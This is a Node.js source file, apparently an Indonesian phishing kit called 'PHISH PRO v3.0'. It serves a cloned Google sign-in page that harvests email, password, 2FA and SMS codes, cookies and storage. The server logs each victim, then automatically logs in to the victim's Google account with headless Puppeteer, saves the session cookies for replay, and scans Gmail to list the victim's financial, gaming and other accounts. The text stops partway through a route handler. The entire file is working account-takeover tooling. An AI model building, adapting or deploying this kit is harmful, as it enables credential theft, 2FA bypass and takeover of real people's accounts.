/**
 * PHISH PRO v3.0 — AUTO-LOGIN + ACCOUNT TAKEOVER ENGINE
 * 
 * Fitur:
 * 1. Phishing multi-step (email → pass → 2FA → phone)
 * 2. Auto-login ke Google pake Puppeteer (bypass 2FA dengan code)
 * 3. Scan inbox buat deteksi semua akun terdaftar
 * 4. One-click access buttons di dashboard
 * 5. Cookie manager buat replay session
 */

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { execSync } = require('child_process');

// Puppeteer setup
let puppeteer, stealthPlugin;
try {
    puppeteer = require('puppeteer-extra');
    stealthPlugin = require('puppeteer-extra-plugin-stealth');
    puppeteer.use(stealthPlugin());
} catch(e) {
    console.log('[!] Puppeteer extra not available, using regular puppeteer');
    puppeteer = require('puppeteer');
}

const app = express();
const PORT = process.env.PORT || 3000;

// ==================== CONFIG ====================
const CONFIG = {
    DASHBOARD_TOKEN: 'gantitoken123',
    PUPPETEER_TIMEOUT: 30000,
    MAX_CONCURRENT_LOGINS: 3,
};

// ==================== STORAGE ====================
const DATA_DIR = path.join(__dirname, 'data');
const VICTIMS_DIR = path.join(DATA_DIR, 'victims');
const SESSIONS_DIR = path.join(DATA_DIR, 'sessions');
const LOGS_DIR = path.join(DATA_DIR, 'logs');

[DATA_DIR, VICTIMS_DIR, SESSIONS_DIR, LOGS_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/static', express.static(path.join(__dirname, 'public')));

function log(msg) {
    const ts = new Date().toISOString();
    const line = `[${ts}] ${msg}\n`;
    fs.appendFileSync(path.join(LOGS_DIR, 'access.log'), line);
    console.log(line.trim());
}

function generateId() { return crypto.randomBytes(8).toString('hex'); }

// ==================== BROWSER POOL ====================
let browserInstance = null;
let browserBusy = false;

async function getBrowser() {
    if (browserInstance && browserInstance.isConnected()) {
        return browserInstance;
    }
    
    log('[BROWSER] Launching new instance...');
    try {
        browserInstance = await puppeteer.launch({
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--window-size=1920,1080',
                '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
            ],
            defaultViewport: { width: 1920, height: 1080 }
        });
        log('[BROWSER] Launched successfully');
        return browserInstance;
    } catch (err) {
        log(`[BROWSER] Failed to launch: ${err.message}`);
        
        // Coba fallback tanpa puppeteer-extra
        try {
            const puppeteerVanilla = require('puppeteer');
            browserInstance = await puppeteerVanilla.launch({
                headless: true,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu'
                ]
            });
            log('[BROWSER] Launched with vanilla puppeteer');
            return browserInstance;
        } catch(e2) {
            log(`[BROWSER] Fallback also failed: ${e2.message}`);
            return null;
        }
    }
}

// ==================== AUTO-LOGIN ENGINE ====================

/**
 * Login ke Google dengan credentials + 2FA code
 * Returns: { success, cookies, sessionId, error }
 */
async function autoLogin(email, password, twoFACode = null) {
    log(`[AUTO-LOGIN] Starting login for ${email}`);
    
    const browser = await getBrowser();
    if (!browser) return { success: false, error: 'No browser available' };
    
    let page = null;
    try {
        page = await browser.newPage();
        await page.setDefaultTimeout(CONFIG.PUPPETEER_TIMEOUT);
        
        // Set bahasa ke English biar konsisten
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9'
        });
        
        // Block resource yang gak perlu (images, fonts, etc) biar cepet
        await page.setRequestInterception(true);
        page.on('request', (req) => {
            const type = req.resourceType();
            if (['image', 'stylesheet', 'font', 'media'].includes(type)) {
                req.abort();
            } else {
                req.continue();
            }
        });
        
        log('[AUTO-LOGIN] Navigating to accounts.google.com...');
        await page.goto('https://accounts.google.com/v3/signin/identifier', {
            waitUntil: 'domcontentloaded',
            timeout: CONFIG.PUPPETEER_TIMEOUT
        });
        
        // Step 1: Isi email
        log('[AUTO-LOGIN] Filling email...');
        await page.waitForSelector('input[type="email"]', { timeout: 10000 });
        await page.type('input[type="email"]', email, { delay: 30 });
        
        // Klik Next
        await page.evaluate(() => {
            const buttons = document.querySelectorAll('button, [role="button"], input[type="submit"]');
            for (const btn of buttons) {
                if (btn.textContent.includes('Next') || btn.value === 'Next' || btn.textContent.includes('Berikutnya')) {
                    btn.click();
                    return;
                }
            }
        });
        
        // Tunggu halaman password
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Step 2: Isi password
        log('[AUTO-LOGIN] Filling password...');
        try {
            await page.waitForSelector('input[type="password"]', { timeout: 10000 });
            await page.type('input[type="password"]', password, { delay: 20 });
            
            // Klik Next
            await page.evaluate(() => {
                const buttons = document.querySelectorAll('button, [role="button"], input[type="submit"]');
                for (const btn of buttons) {
                    if (btn.textContent.includes('Next') || btn.value === 'Next' || btn.textContent.includes('Berikutnya')) {
                        btn.click();
                        return;
                    }
                }
            });
        } catch(e) {
            log(`[AUTO-LOGIN] Password field not found. Account might not exist or different flow.`);
        }
        
        // Tunggu response (2FA challenge or success)
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Step 3: Handle 2FA if present
        let twoFAChallenge = false;
        try {
            // Check if 2FA code input is visible
            const codeInput = await page.$('input[type="text"][inputmode="numeric"]');
            if (codeInput && twoFACode) {
                twoFAChallenge = true;
                log(`[AUTO-LOGIN] 2FA challenge detected! Entering code: ${twoFACode}`);
                await codeInput.type(twoFACode, { delay: 50 });
                
                // Klik Next / Verify
                await page.evaluate(() => {
                    const buttons = document.querySelectorAll('button, [role="button"]');
                    for (const btn of buttons) {
                        if (btn.textContent.includes('Next') || btn.textContent.includes('Verify')) {
                            btn.click();
                            return;
                        }
                    }
                });
                
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        } catch(e) {
            log(`[AUTO-LOGIN] No 2FA challenge: ${e.message}`);
        }
        
        // Step 4: Check if login succeeded
        let currentUrl = page.url();
        let loginSuccess = false;
        let pageContent = '';
        
        try {
            pageContent = await page.content();
        } catch(e) {}
        
        // Check various success indicators
        if (currentUrl.includes('myaccount') || currentUrl.includes('accounts.google.com/signin/v2') && currentUrl.includes('flowName')) {
            loginSuccess = true;
        } else if (pageContent.includes('Welcome') || pageContent.includes('My Account') || pageContent.includes('Google Account')) {
            loginSuccess = true;
        } else if (pageContent.includes('inbox') || pageContent.includes('Google Mail')) {
            loginSuccess = true;
        }
        
        // Try navigating to myaccount to confirm
        if (!loginSuccess) {
            try {
                await page.goto('https://myaccount.google.com/', {
                    waitUntil: 'domcontentloaded',
                    timeout: 10000
                });
                currentUrl = page.url();
                if (currentUrl.includes('myaccount') || currentUrl.includes('signin')) {
                    loginSuccess = !currentUrl.includes('signin');
                }
            } catch(e) {}
        }
        
        if (loginSuccess) {
            log(`[✅ AUTO-LOGIN SUCCESS] ${email}`);
            
            // Extract ALL cookies from all domains
            const cookies = await page.cookies();
            const allCookies = cookies.map(c => `${c.name}=${c.value}`);
            
            // Also get localStorage and sessionStorage
            let localStorageData = {};
            let sessionStorageData = {};
            try {
                localStorageData = await page.evaluate(() => {
                    return JSON.parse(JSON.stringify(localStorage));
                });
                sessionStorageData = await page.evaluate(() => {
                    return JSON.parse(JSON.stringify(sessionStorage));
                });
            } catch(e) {}
            
            // Save session
            const sessionId = generateId();
            const sessionData = {
                sessionId,
                email,
                loginTime: new Date().toISOString(),
                cookies,
                cookieString: allCookies.join('; '),
                localStorage: localStorageData,
                sessionStorage: sessionStorageData,
                userAgent: await page.evaluate(() => navigator.userAgent)
            };
            
            fs.writeFileSync(
                path.join(SESSIONS_DIR, `${email.replace(/[^a-zA-Z0-9]/g, '_')}_${sessionId}.json`),
                JSON.stringify(sessionData, null, 2)
            );
            
            log(`[AUTO-LOGIN] ${allCookies.length} cookies saved (session: ${sessionId})`);
            
            await page.close();
            return {
                success: true,
                sessionId,
                email,
                cookies: allCookies.length,
                cookieString: allCookies.join('; ').substring(0, 200) + '...'
            };
        } else {
            log(`[❌ AUTO-LOGIN FAILED] ${email} - URL: ${currentUrl}`);
            
            // Check error reason
            let error = 'Unknown';
            if (pageContent.includes('wrong') || pageContent.includes('incorrect')) error = 'Wrong password';
            else if (pageContent.includes('not found') || pageContent.includes('Couldn\'t find')) error = 'Account not found';
            else if (pageContent.includes('verify')) error = '2FA verification needed';
            else if (currentUrl.includes('challenge')) error = 'Security challenge';
            else if (pageContent.includes('phone')) error = 'Phone verification';
            
            await page.close();
            return { success: false, error, url: currentUrl };
        }
        
    } catch (err) {
        log(`[AUTO-LOGIN] Error: ${err.message}`);
        if (page) await page.close().catch(() => {});
        return { success: false, error: err.message };
    }
}

// ==================== ACCOUNT SCANNER ====================

const PLATFORM_PATTERNS = [
    // Sosial Media
    { name: 'Instagram',     keywords: ['instagram', 'ig'], type: 'sosmed', icon: '📷', url: 'https://instagram.com' },
    { name: 'Facebook',      keywords: ['facebook', 'fb'], type: 'sosmed', icon: '📘', url: 'https://facebook.com' },
    { name: 'Twitter / X',   keywords: ['twitter', 'x.com'], type: 'sosmed', icon: '🐦', url: 'https://twitter.com' },
    { name: 'TikTok',        keywords: ['tiktok'], type: 'sosmed', icon: '🎵', url: 'https://tiktok.com' },
    { name: 'Discord',       keywords: ['discord'], type: 'sosmed', icon: '💬', url: 'https://discord.com' },
    { name: 'Telegram',      keywords: ['telegram'], type: 'sosmed', icon: '✈️', url: 'https://web.telegram.org' },
    { name: 'LinkedIn',      keywords: ['linkedin'], type: 'sosmed', icon: '💼', url: 'https://linkedin.com' },
    { name: 'Snapchat',      keywords: ['snapchat'], type: 'sosmed', icon: '👻', url: 'https://snapchat.com' },
    { name: 'Pinterest',     keywords: ['pinterest'], type: 'sosmed', icon: '📌', url: 'https://pinterest.com' },
    { name: 'Reddit',        keywords: ['reddit'], type: 'sosmed', icon: '🤖', url: 'https://reddit.com' },
    { name: 'Threads',       keywords: ['threads'], type: 'sosmed', icon: '🧵', url: 'https://threads.net' },
    
    // E-commerce
    { name: 'Shopee',        keywords: ['shopee'], type: 'belanja', icon: '🛒', url: 'https://shopee.co.id' },
    { name: 'Tokopedia',     keywords: ['tokopedia'], type: 'belanja', icon: '🛍️', url: 'https://tokopedia.com' },
    { name: 'Lazada',        keywords: ['lazada'], type: 'belanja', icon: '📦', url: 'https://lazada.co.id' },
    { name: 'Bukalapak',     keywords: ['bukalapak'], type: 'belanja', icon: '🏪', url: 'https://bukalapak.com' },
    { name: 'Amazon',        keywords: ['amazon'], type: 'belanja', icon: '📦', url: 'https://amazon.com' },
    { name: 'OLX',           keywords: ['olx'], type: 'belanja', icon: '🏷️', url: 'https://olx.co.id' },
    { name: 'Blibli',        keywords: ['blibli'], type: 'belanja', icon: '🛒', url: 'https://blibli.com' },
    
    // Finance
    { name: 'PayPal',        keywords: ['paypal'], type: 'finansial', icon: '💳', url: 'https://paypal.com' },
    { name: 'Binance',       keywords: ['binance'], type: 'finansial', icon: '💰', url: 'https://binance.com' },
    { name: 'Indodax',       keywords: ['indodax'], type: 'finansial', icon: '📈', url: 'https://indodax.com' },
    { name: 'GoPay / Gojek', keywords: ['gopay', 'gojek', 'gofood'], type: 'finansial', icon: '🟢', url: 'https://gojek.com' },
    { name: 'OVO',           keywords: ['ovo'], type: 'finansial', icon: '🟣', url: 'https://ovo.id' },
    { name: 'DANA',          keywords: ['dana'], type: 'finansial', icon: '💙', url: 'https://dana.id' },
    { name: 'LinkAja',       keywords: ['linkaja'], type: 'finansial', icon: '🔗', url: 'https://linkaja.id' },
    
    // Gaming
    { name: 'Steam',         keywords: ['steam'], type: 'game', icon: '🎮', url: 'https://steamcommunity.com' },
    { name: 'Epic Games',    keywords: ['epic games', 'epicgames'], type: 'game', icon: '🕹️', url: 'https://epicgames.com' },
    { name: 'Mobile Legends',keywords: ['mobile legends', 'mlbb'], type: 'game', icon: '📱', url: 'https://m.mobilelegends.com' },
    { name: 'Valorant / Riot',keywords: ['valorant', 'riot games', 'league of legends'], type: 'game', icon: '🔫', url: 'https://riotgames.com' },
    { name: 'Roblox',        keywords: ['roblox'], type: 'game', icon: '🧱', url: 'https://roblox.com' },
    { name: 'Minecraft',     keywords: ['minecraft', 'mojang'], type: 'game', icon: '⛏️', url: 'https://minecraft.net' },
    { name: 'PUBG',          keywords: ['pubg'], type: 'game', icon: '🎯', url: 'https://pubg.com' },
    { name: 'Free Fire',     keywords: ['free fire', 'garena'], type: 'game', icon: '🔥', url: 'https://ff.garena.com' },
    { name: 'Genshin Impact',keywords: ['genshin'], type: 'game', icon: '✨', url: 'https://genshin.hoyoverse.com' },
    
    // Streaming
    { name: 'Netflix',       keywords: ['netflix'], type: 'streaming', icon: '🎬', url: 'https://netflix.com' },
    { name: 'Spotify',       keywords: ['spotify'], type: 'streaming', icon: '🎵', url: 'https://spotify.com' },
    { name: 'YouTube',       keywords: ['youtube'], type: 'streaming', icon: '▶️', url: 'https://youtube.com' },
    { name: 'Disney+',       keywords: ['disney+', 'disneyplus'], type: 'streaming', icon: '🏰', url: 'https://disneyplus.com' },
    { name: 'Viu',           keywords: ['viu'], type: 'streaming', icon: '📺', url: 'https://viu.com' },
    { name: 'Vidio',         keywords: ['vidio'], type: 'streaming', icon: '📺', url: 'https://vidio.com' },
    { name: 'IQIYI',         keywords: ['iqiyi'], type: 'streaming', icon: '📺', url: 'https://iq.com' },
    
    // Productivity
    { name: 'GitHub',        keywords: ['github'], type: 'tech', icon: '💻', url: 'https://github.com' },
    { name: 'GitLab',        keywords: ['gitlab'], type: 'tech', icon: '🦊', url: 'https://gitlab.com' },
    { name: 'Canva',         keywords: ['canva'], type: 'tech', icon: '🎨', url: 'https://canva.com' },
    { name: 'Figma',         keywords: ['figma'], type: 'tech', icon: '🖌️', url: 'https://figma.com' },
    { name: 'Dropbox',       keywords: ['dropbox'], type: 'tech', icon: '📂', url: 'https://dropbox.com' },
    { name: 'Notion',        keywords: ['notion'], type: 'tech', icon: '📝', url: 'https://notion.so' },
    { name: 'Trello',        keywords: ['trello'], type: 'tech', icon: '📋', url: 'https://trello.com' },
    { name: 'Slack',         keywords: ['slack'], type: 'tech', icon: '💬', url: 'https://slack.com' },
    { name: 'WordPress',     keywords: ['wordpress'], type: 'tech', icon: '🌐', url: 'https://wordpress.com' },
    { name: 'Cloudflare',    keywords: ['cloudflare'], type: 'tech', icon: '☁️', url: 'https://dash.cloudflare.com' },
    { name: 'AWS',           keywords: ['amazon web', 'aws'], type: 'tech', icon: '☁️', url: 'https://aws.amazon.com' },
    
    // Transport & Lifestyle
    { name: 'Grab',          keywords: ['grab'], type: 'transport', icon: '🚗', url: 'https://grab.com' },
    { name: 'Traveloka',     keywords: ['traveloka'], type: 'travel', icon: '✈️', url: 'https://traveloka.com' },
    { name: 'Booking.com',   keywords: ['booking.com', 'booking'], type: 'travel', icon: '🏨', url: 'https://booking.com' },
    { name: 'Airbnb',        keywords: ['airbnb'], type: 'travel', icon: '🏠', url: 'https://airbnb.com' },
    { name: 'Tiket.com',     keywords: ['tiket.com'], type: 'travel', icon: '🎫', url: 'https://tiket.com' },
    
    // Email & Cloud
    { name: 'Outlook',       keywords: ['outlook', 'microsoft account'], type: 'email', icon: '📧', url: 'https://outlook.live.com' },
    { name: 'iCloud',        keywords: ['icloud', 'apple id'], type: 'email', icon: '🍎', url: 'https://icloud.com' },
    { name: 'ProtonMail',    keywords: ['protonmail', 'proton'], type: 'email', icon: '🔒', url: 'https://proton.me' },
    { name: 'Google Drive',  keywords: ['google drive', 'googledrive'], type: 'cloud', icon: '📁', url: 'https://drive.google.com' },
    { name: 'OneDrive',      keywords: ['onedrive'], type: 'cloud', icon: '☁️', url: 'https://onedrive.live.com' },
];

/**
 * Simulasi scan akun berdasarkan email yang didapat
 * Ini nanti bakal di-improve dengan scan inbox real via Puppeteer
 */
function detectPlatformsFromInbox(emailSubjects) {
    const detected = [];
    const emailText = (emailSubjects || []).join(' ').toLowerCase();
    
    for (const platform of PLATFORM_PATTERNS) {
        for (const keyword of platform.keywords) {
            if (emailText.includes(keyword)) {
                // Avoid duplicates
                if (!detected.find(d => d.name === platform.name)) {
                    detected.push({
                        ...platform,
                        confidence: 'high',
                        matchedKeyword: keyword
                    });
                }
                break;
            }
        }
    }
    
    return detected;
}

/**
 * Scan inbox pake Puppeteer setelah login
 */
async function scanVictimAccounts(email, sessionId) {
    log(`[SCANNER] Starting account scan for ${email} (session: ${sessionId})`);
    
    // Load session cookies
    const sessionFiles = fs.readdirSync(SESSIONS_DIR).filter(f => f.includes(email.replace(/[^a-zA-Z0-9]/g, '_')));
    if (sessionFiles.length === 0) {
        log('[SCANNER] No session found');
        return { success: false, error: 'No session. Run auto-login first.' };
    }
    
    const sessionData = JSON.parse(fs.readFileSync(path.join(SESSIONS_DIR, sessionFiles[0]), 'utf-8'));
    
    const browser = await getBrowser();
    if (!browser) return { success: false, error: 'No browser' };
    
    let page = null;
    try {
        page = await browser.newPage();
        
        // Apply saved cookies
        if (sessionData.cookies) {
            await page.setCookie(...sessionData.cookies);
        }
        
        // Navigate to Gmail
        log('[SCANNER] Navigating to Gmail...');
        await page.goto('https://mail.google.com/mail/u/0/#inbox', {
            waitUntil: 'domcontentloaded',
            timeout: 20000
        });
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Check if we're logged in
        const pageUrl = page.url();
        if (pageUrl.includes('signin') || pageUrl.includes('Login')) {
            log('[SCANNER] Session expired, need to re-login');
            await page.close();
            return { success: false, error: 'Session expired', needsRelogin: true };
        }
        
        log('[SCANNER] Logged in to Gmail!');
        
        // Try to extract email subjects
        let subjects = [];
        try {
            // Wait for email list to load
            await page.waitForSelector('h2, .zA, tr', { timeout: 10000 }).catch(() => {});
            
            // Extract email subjects from the inbox
            subjects = await page.evaluate(() => {
                const items = [];
                // Gmail subject selectors
                const selectors = [
                    '.zA .bog',           // Primary inbox
                    '.zE .bog',           // Social/Promotions
                    'tr .bog',            // Fallback
                    'span[data-thread-id]', // Another fallback
                    'h2[data-thread-id]'
                ];
                
                for (const sel of selectors) {
                    const elements = document.querySelectorAll(sel);
                    if (elements.length > 0) {
                        elements.forEach(el => {
                            const text = el.textContent.trim();
                            if (text && text.length > 3) items.push(text);
                        });
                        break;
                    }
                }
                
                // If nothing found, try getting all visible text
                if (items.length === 0) {
                    document.querySelectorAll('table tr').forEach(row => {
                        const text = row.textContent.trim();
                        if (text && text.includes('@') || text.match(/(welcome|verify|reset|confirm)/i)) {
                            items.push(text.substring(0, 200));
                        }
                    });
                }
                
                return items.slice(0, 100);
            });
            
            log(`[SCANNER] Extracted ${subjects.length} email subjects`);
        } catch(e) {
            log(`[SCANNER] Error extracting subjects: ${e.message}`);
        }
        
        // Detect platforms from subjects
        const platforms = detectPlatformsFromInbox(subjects);
        log(`[SCANNER] Detected ${platforms.length} platforms`);
        
        // Save scan result
        const scanResult = {
            email,
            scanTime: new Date().toISOString(),
            totalEmails: subjects.length,
            platforms: platforms.map(p => ({
                name: p.name,
                type: p.type,
                icon: p.icon,
                url: p.url,
                confidence: p.confidence
            })),
            recentSubjects: subjects.slice(0, 30)
        };
        
        const scanFile = path.join(SESSIONS_DIR, `scan_${email.replace(/[^a-zA-Z0-9]/g, '_')}.json`);
        fs.writeFileSync(scanFile, JSON.stringify(scanResult, null, 2));
        
        await page.close();
        return scanResult;
        
    } catch (err) {
        log(`[SCANNER] Error: ${err.message}`);
        if (page) await page.close().catch(() => {});
        return { success: false, error: err.message };
    }
}

// ==================== PHISHING PAGE ====================

const PHISH_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Sign in - Google Accounts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,Arial,sans-serif}
body{background:#fff;display:flex;flex-direction:column;align-items:center;min-height:100vh;justify-content:center;padding:20px}
.card{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.logo{text-align:center;margin-bottom:20px}
.logo svg{width:75px;height:24px}
h1{font-size:24px;font-weight:400;color:#202124;text-align:center}
.subtitle{text-align:center;color:#5f6368;font-size:14px;margin:8px 0 30px}
.input-group{margin-bottom:20px;position:relative}
.input-group input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;transition:border .2s;background:transparent}
.input-group input:focus{border-color:#1a73e8}
.input-group label{position:absolute;left:15px;top:13px;color:#5f6368;font-size:16px;pointer-events:none;transition:.2s;background:#fff;padding:0 4px}
.input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{top:-10px;font-size:12px;color:#1a73e8}
.input-group .error-msg{color:#d93025;font-size:12px;margin-top:4px;display:none}
.link{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;cursor:pointer;display:inline-block;margin:6px 0}
.link:hover{color:#174ea6}
.btn-row{display:flex;justify-content:space-between;align-items:center;margin-top:30px}
.btn-create{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;cursor:pointer;background:none;border:none}
.btn-next{background:#1a73e8;color:#fff;border:none;padding:9px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;transition:background .2s;min-width:80px}
.btn-next:hover{background:#1b66c9}.btn-next:disabled{opacity:.6;cursor:not-allowed}
#step2,#step3,#step4{display:none}
.loader{display:none;text-align:center;padding:40px 0}
.spinner{width:40px;height:40px;border:4px solid #e0e0e0;border-top:4px solid #1a73e8;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}
@keyframes spin{to{transform:rotate(360deg)}}
.loader p{color:#5f6368;font-size:14px}.footer{text-align:center;color:#5f6368;font-size:12px;margin-top:24px}
</style>
</head>
<body>
<div class="card" id="step1">
  <div class="logo"><svg viewBox="0 0 75 24"><path d="M8 24V8H5V5h3V2c0-2 1.5-4 4-4h3v3h-2c-1 0-2 .5-2 2v2h4v3h-8v16H8z" fill="#1a73e8"/></svg></div>
  <h1>Sign in</h1>
  <div class="subtitle">Use your Google Account</div>
  <div class="input-group">
    <input type="email" id="email" placeholder=" " autocomplete="off" autofocus>
    <label for="email">Email or phone</label>
    <div class="error-msg" id="emailError">Couldn't find your Google Account</div>
  </div>
  <a class="link" href="#">Forgot email?</a>
  <div class="btn-row">
    <button class="btn-create">Create account</button>
    <button class="btn-next" onclick="nextStep()">Next</button>
  </div>
</div>

<div class="card" id="step2">
  <div class="logo"><svg viewBox="0 0 75 24"><path d="M8 24V8H5V5h3V2c0-2 1.5-4 4-4h3v3h-2c-1 0-2 .5-2 2v2h4v3h-8v16H8z" fill="#1a73e8"/></svg></div>
  <h1>Hi</h1>
  <div class="subtitle" id="displayEmail" style="font-weight:500">user@gmail.com</div>
  <div class="input-group" style="margin-top:24px">
    <input type="password" id="password" placeholder=" " autocomplete="off">
    <label for="password">Enter your password</label>
    <div class="error-msg" id="passError">Wrong password. Try again</div>
  </div>
  <a class="link" href="#">Forgot password?</a>
  <div class="btn-row">
    <button class="btn-create" onclick="prevStep()" style="background:none;border:none;cursor:pointer;color:#1a73e8;font-size:14px;font-weight:500">Back</button>
    <button class="btn-next" onclick="submitPass()">Next</button>
  </div>
</div>

<div class="card" id="step3">
  <div class="logo"><svg viewBox="0 0 75 24"><path d="M8 24V8H5V5h3V2c0-2 1.5-4 4-4h3v3h-2c-1 0-2 .5-2 2v2h4v3h-8v16H8z" fill="#1a73e8"/></svg></div>
  <h1>2-Step Verification</h1>
  <div class="subtitle">Enter the code from Google Authenticator or your phone</div>
  <div class="input-group" style="margin-top:24px">
    <input type="text" id="code" placeholder=" " autocomplete="off" maxlength="6" style="letter-spacing:8px;font-size:28px;text-align:center;font-weight:500">
    <label for="code">Verification code</label>
    <div class="error-msg" id="codeError">Invalid code</div>
  </div>
  <a class="link" href="#">Try another way</a>
  <div class="btn-row">
    <button class="btn-create" onclick="prevStep()" style="background:none;border:none;cursor:pointer;color:#1a73e8;font-size:14px;font-weight:500">Back</button>
    <button class="btn-next" onclick="submitCode()">Verify</button>
  </div>
</div>

<div class="card" id="step4">
  <div class="logo"><svg viewBox="0 0 75 24"><path d="M8 24V8H5V5h3V2c0-2 1.5-4 4-4h3v3h-2c-1 0-2 .5-2 2v2h4v3h-8v16H8z" fill="#1a73e8"/></svg></div>
  <h1>Phone verification</h1>
  <div class="subtitle">Google sent a code to your phone</div>
  <div class="input-group" style="margin-top:24px">
    <input type="tel" id="phone" placeholder=" " autocomplete="off">
    <label for="phone">Phone number</label>
  </div>
  <div class="input-group">
    <input type="text" id="smsCode" placeholder=" " autocomplete="off" maxlength="6" style="letter-spacing:8px;font-size:24px;text-align:center;font-weight:500">
    <label for="smsCode">SMS code</label>
    <div class="error-msg" id="smsError">Invalid code</div>
  </div>
  <div class="btn-row">
    <button class="btn-next" onclick="submitSMS()" style="margin-left:auto">Verify</button>
  </div>
</div>

<div class="loader" id="loader">
  <div class="spinner"></div>
  <p>Verifying your information...</p>
</div>

<script>
let step = 1;
let collected = {
  step: 1,
  email: '', password: '', code: '', phone: '', sms: '',
  cookies: document.cookie,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage),
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  language: navigator.language,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  timestamp: new Date().toISOString(),
  url: location.href,
  referrer: document.referrer
};

function nextStep() {
  const email = document.getElementById('email').value.trim();
  if (!email.includes('@')) { document.getElementById('emailError').style.display='block'; return; }
  document.getElementById('emailError').style.display='none';
  collected.email = email;
  collected.step = 1;
  document.getElementById('displayEmail').textContent = email;
  sendData(collected);
  showStep(2); document.getElementById('password').focus();
}

function submitPass() {
  const pass = document.getElementById('password').value;
  if (pass.length < 3) { document.getElementById('passError').style.display='block'; return; }
  document.getElementById('passError').style.display='none';
  collected.password = pass; collected.step = 2;
  showLoader();
  sendData(collected);
  setTimeout(() => { hideLoader(); showStep(3); document.getElementById('code').focus(); }, 1500);
}

function submitCode() {
  const code = document.getElementById('code').value;
  if (code.length < 4) { document.getElementById('codeError').style.display='block'; return; }
  document.getElementById('codeError').style.display='none';
  collected.code = code; collected.step = 3;
  showLoader();
  sendData(collected);
  setTimeout(() => { hideLoader(); showStep(4); document.getElementById('phone').focus(); }, 1500);
}

function submitSMS() {
  collected.phone = document.getElementById('phone').value;
  collected.sms = document.getElementById('smsCode').value;
  collected.step = 4; collected.final = true;
  showLoader();
  sendData(collected);
  setTimeout(() => { window.location.href='https://accounts.google.com'; }, 2000);
}

function showStep(n) { document.querySelectorAll('.card').forEach(c=>c.style.display='none'); document.getElementById('step'+n).style.display='block'; }
function prevStep() {
  if (document.getElementById('step2').style.display==='block') showStep(1);
  else if (document.getElementById('step3').style.display==='block') showStep(2);
  else if (document.getElementById('step4').style.display==='block') showStep(3);
}
function showLoader() { document.querySelectorAll('.card').forEach(c=>c.style.display='none'); document.getElementById('loader').style.display='block'; }
function hideLoader() { document.getElementById('loader').style.display='none'; }

function sendData(data) {
  try { navigator.sendBeacon('/collect', JSON.stringify(data)); } catch(e) {
    fetch('/collect', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data),keepalive:true}).catch(()=>{});
  }
}

document.addEventListener('keydown',e=>{
  if(e.key!=='Enter') return;
  if(document.getElementById('step1').style.display!=='none') nextStep();
  else if(document.getElementById('step2').style.display!=='none') submitPass();
  else if(document.getElementById('step3').style.display!=='none') submitCode();
  else if(document.getElementById('step4').style.display!=='none') submitSMS();
});
</script>
</body>
</html>`;

// ==================== ROUTES ====================

// Serve phishing page
app.get('/', (req, res) => {
    res.send(PHISH_HTML);
});

// Collect data endpoint
app.post('/collect', async (req, res) => {
    const data = {
        ...req.body,
        ip: req.headers['x-forwarded-for'] || req.ip,
        receivedAt: new Date().toISOString()
    };
    
    const safeEmail = (data.email || 'unknown').replace(/[^a-zA-Z0-9@._-]/g, '_');
    const timestamp = Date.now();
    const filename = path.join(VICTIMS_DIR, `${safeEmail}_${timestamp}.json`);
    fs.writeFileSync(filename, JSON.stringify(data, null, 2));
    
    log(`[🔥 VICTIM] ${data.email} | Step ${data.step} | ${data.ip}`);
    
    // Log credentials
    const logLine = `[${data.receivedAt}] ${data.email} | Pass:${data.password || '-'} | 2FA:${data.code || '-'} | Phone:${data.phone || '-'} | SMS:${data.sms || '-'} | IP:${data.ip}\n`;
    fs.appendFileSync(path.join(DATA_DIR, 'victims.log'), logLine);
    
    res.json({ status: 'ok' });
    
    // If we have password + (2fa code or no 2FA needed), auto-login in background
    if (data.password && data.password.length > 3 && data.step >= 2) {
        log(`[AUTO] Starting auto-login for ${data.email}...`);
        
        const result = await autoLogin(data.email, data.password, data.code || null);
        
        if (result.success) {
            log(`[✅ AUTO-LOGIN] ${data.email} - Session: ${result.sessionId}`);
            
            // Update victim file with session info
            try {
                const victimData = JSON.parse(fs.readFileSync(filename, 'utf-8'));
                victimData.autoLogin = {
                    success: true,
                    sessionId: result.sessionId,
                    time: new Date().toISOString()
                };
                fs.writeFileSync(filename, JSON.stringify(victimData, null, 2));
            } catch(e) {}
            
            // Start account scanning in background
            scanVictimAccounts(data.email, result.sessionId).then(scanRes => {
                if (scanRes.platforms) {
                    log(`[✅ SCAN] ${data.email}: ${scanRes.platforms.length} platforms detected`);
                }
